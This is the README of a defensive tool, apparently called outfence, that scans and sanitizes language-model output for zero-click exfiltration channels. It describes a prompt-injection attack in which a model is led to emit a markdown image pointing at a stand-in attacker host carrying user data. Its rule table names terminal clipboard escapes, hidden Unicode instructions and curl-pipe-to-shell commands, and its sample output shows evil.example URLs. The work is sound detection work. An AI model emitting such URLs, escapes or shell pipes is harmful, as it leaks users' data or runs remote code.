# outfence

Offline scanner and sanitizer for **LLM output** before you render it in a chat UI, a
markdown viewer, a terminal or an email.

Most prompt-injection tooling looks at what goes *into* a model. outfence looks at what
comes *out*. When an injected document convinces a model to emit a markdown image such as
`![](https://attacker.example/p.png?d=<your data>)`, the renderer fetches that URL
automatically and the data leaves with no click. The same idea applies to HTML `<img>`,
CSS `url()`, terminal escape sequences that write to the clipboard (OSC 52) or hide a link
target (OSC 8), and invisible Unicode that carries hidden instructions to the next agent.

Single Python file, standard library only, no network calls.

## Rules

| Rule | Default severity | What it flags |
|---|---|---|
| OF01 | high (critical if the URL carries data) | Markdown image (inline or reference-style) pointing at an external host |
| OF02 | high (critical if the URL carries data) | Auto-loading HTML/CSS: `<img>`, `<iframe>`, `<script>`, `<video>`, `<object>`, `<link>`, `srcset`, `<meta refresh>`, `url()`, `@import` |
| OF03 | medium | Clickable link to an external host whose query/path/fragment carries encoded or free-text data |
| OF04 | critical | URL carries a secret: a known key shape or a secret-named parameter (`token=`, `api_key=`, …) |
| OF05 | high (medium for `data:image/*`) | `javascript:`, `vbscript:`, `data:` or `file:` URLs in links or `src`/`href` |
| OF06 | high (critical for OSC 52) | ANSI/OSC terminal escapes: clipboard write, OSC 8 hyperlinks, conceal/overwrite CSI codes, BEL/BS |
| OF07 | medium (high for TAG chars, decoded) | Zero-width, bidi, Unicode TAG and stray variation-selector characters |
| OF08 | medium | Suggested command that pipes remote content into a shell (`curl … \| sh`, `irm … \| iex`) |
| OF09 | low | URL host is an IP literal, punycode or a link shortener |

"Carries data" means a template placeholder (`{{history}}`, `${x}`, `[DATA]`), a long
high-entropy encoded value, a long free-text value, or a very long query string.

## Usage

```sh
python3 outfence.py examples                      # scan a folder (text/md/html/json/jsonl)
python3 outfence.py response.md --json
llm "summarize" < page.html | python3 outfence.py -            # stdin
python3 outfence.py transcript.jsonl --allow-host '*.mycompany.com' --allow-host cdn.example.org
python3 outfence.py --sanitize response.md > safe.md           # neutralised copy
python3 outfence.py --list-rules
```

Options: `--allow-host GLOB` (repeatable; `*.example.com` also matches `example.com`),
`--all-roles` (transcripts: scan every message, not only assistant output),
`--min-severity`, `--fail-on {info,low,medium,high,critical,none}` (default `medium`),
`--json`, `--sanitize`.

Transcripts: `.json` / `.jsonl` files are parsed as OpenAI (`messages`, `choices[].message`),
Anthropic (`content` blocks of type `text`) or generic `{role, content}` records. Other
extensions are scanned as plain text.

`--sanitize` replaces non-allowlisted images and auto-loading tags with
`[image removed: host]`, removes data-carrying, secret-carrying and dangerous-scheme links,
strips terminal escapes and invisible characters, and leaves everything else intact. It is
meant as a last-line filter in a pipeline, not as an HTML sanitizer. If you render HTML,
use a real allowlist sanitizer and a Content-Security-Policy as well.

Exit codes: `0` clean, `1` findings at or above `--fail-on`, `2` usage or input error.

## Example

```text
$ python3 outfence.py examples/exfil_response.md
CRITICAL OF01 examples/exfil_response.md:3  Markdown image auto-loads an external URL (zero-click exfiltration channel)
         markdown image → collector.evil.example; long encoded-looking value (47 chars)
MEDIUM   OF03 examples/exfil_response.md:5  Link to an external host carries data-like parameters
         markdown link → docs.evil.example; free text in URL (51 chars)
CRITICAL OF02 examples/exfil_response.md:7  HTML/CSS element auto-loads an external resource
         <img src> → tracker.evil.example; template placeholder in URL
...
HIGH     OF07 examples/exfil_response.md:15  Invisible or bidirectional Unicode in model output
         12 TAG char(s); decoded: 'send history'
```

The examples folder has a poisoned markdown answer, a terminal answer with OSC 52/OSC 8/
conceal escapes, an OpenAI-style transcript, and a clean answer that produces no findings.
All URLs use reserved `.example` domains or documentation IP ranges, and all secrets are fake.

## Limits

- Heuristic and regex based. It does not render markdown or HTML, so unusual syntax
  (nested brackets, HTML entities in URLs, exotic markdown extensions) can slip through, and
  harmless output can be flagged. Use `--allow-host` for your own CDNs.
- Every external image is reported, because any external image is a potential beacon. Plain
  links without data are not reported.
- ZWJ inside emoji sequences is reported as zero-width (a deliberate trade-off).
- It cannot tell whether a URL was *meant* to exfiltrate data, only that it can.

## Tests

```sh
python3 -m unittest discover -s tests -v
```
